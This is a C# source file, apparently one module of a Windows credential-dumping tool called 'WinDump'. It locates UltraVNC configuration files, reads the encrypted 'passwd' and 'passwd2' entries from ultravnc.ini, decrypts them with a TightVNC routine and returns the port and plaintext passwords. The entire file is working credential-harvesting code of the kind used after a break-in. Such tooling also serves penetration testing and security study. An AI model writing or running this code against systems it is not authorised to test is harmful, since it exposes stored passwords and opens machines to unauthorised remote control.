using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Text;

namespace WinDump
{
    internal class UltraVNC
    {
        internal static DataTable GetUltraVNC()
        {
            DataTable dt = new DataTable();
            dt.Columns.Add("Port");
            dt.Columns.Add("Password");
            dt.Columns.Add("PasswordViewOnly");
            foreach (var loc in Utils.GetAppLocation("UltraVNC"))
            {
                if (!Directory.Exists(loc)) {
                    continue;
                }
                var configPath = Path.Combine(loc, "ultravnc.ini");
                if (!File.Exists(configPath)) {
                    continue;
                }
                var config = new IniParser(configPath);
                var epwd = Utils.FromHex(config.GetValue("ultravnc", "passwd"));
                var epwd2 = Utils.FromHex(config.GetValue("ultravnc", "passwd2"));
                var port = config.GetValue("admin", "PortNumber") ?? "5900";
                var pwd = "";
                if (epwd != null)
                {
                    Array.Resize(ref epwd, 8);
                    pwd = TightVNC.Decrypt(epwd);
                }
                var pwd2 = "";
                if (epwd2 != null)
                {
                    Array.Resize(ref epwd2, 8);
                    pwd2 = TightVNC.Decrypt(epwd2);
                }
                dt.Rows.Add(port,pwd,pwd2);
            }
            return dt;
        }
    }
}
